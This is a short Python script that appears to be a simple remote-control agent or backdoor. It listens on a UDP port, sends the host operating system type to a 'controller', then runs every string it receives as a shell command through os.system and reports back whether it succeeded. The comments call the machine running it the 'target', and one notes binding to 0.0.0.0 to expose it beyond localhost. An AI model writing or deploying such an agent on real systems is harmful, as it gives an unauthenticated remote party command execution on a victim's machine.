import socket,time,os,sys,subprocess
#UDP Socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
myaddress=("127.0.0.1",9999)   #0.0.0.0==for automatically get ip address
try:
    s.bind(myaddress)
    #target OS type== darwin:Mac,Linux,win32
    os_type=sys.platform
    data=s.recvfrom(20)
    print(data)
    #sneding os details to client
    s.sendto(os_type.encode('ascii'),data[1]) #data[1]: for target address
    while True:
        clrdata=s.recvfrom(100)#receiving data from controller
        #validating instructions
        cmd=clrdata[0].decode('ascii')
        check=os.system(cmd) #executing command
        if check==0:
            print("Instruction Found.")
            s.sendto("Instruction found and executed".encode('ascii'),clrdata[1])
        else:
            print("Instruction not Found..")
            s.sendto("Instruction not found".encode('ascii'),clrdata[1])

except:
    print("socket binding failed")
    time.sleep(1)
    print("ok check your port number")

    
